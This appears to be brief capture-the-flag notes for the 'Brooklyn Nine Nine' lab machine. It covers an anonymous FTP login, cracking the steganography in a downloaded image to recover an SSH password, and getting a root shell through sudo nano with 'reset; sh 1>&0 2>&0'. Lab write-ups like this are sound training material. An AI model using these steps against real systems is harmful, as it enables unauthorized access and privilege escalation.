# Brooklyn Nine Nine
```
export ip = 10.10.149.39
```
## SCAN
```
21 FTP : Anonymous Loing Allowed
80 HTTP 
```

## FTP
```
1. ftp 
2. open export_ip
3. get nate_to_jake.txt
--> ID : holt 
```

## WEB
```
1. wget http://{{export_ip}}/brooklyn99.jpg

2. stegcracker brooklyn99.jpg {rockyou.txt}

3. brooklyn99.jpg.out
--> password : fluffydog12@ninenine
```

## Gaining Access
```
1. ssh holt@export_ip 
: password is fluffydog12@ninenine

2. read user.txt
```

## Privilige Escalate
```
1. sudo -l
2. /bin/nano
3. sudo /bin/nano
[SUID]
-- nano
-- ^R^X
-- reset; sh 1>&0 2>&0

4. read /root/root.txt
```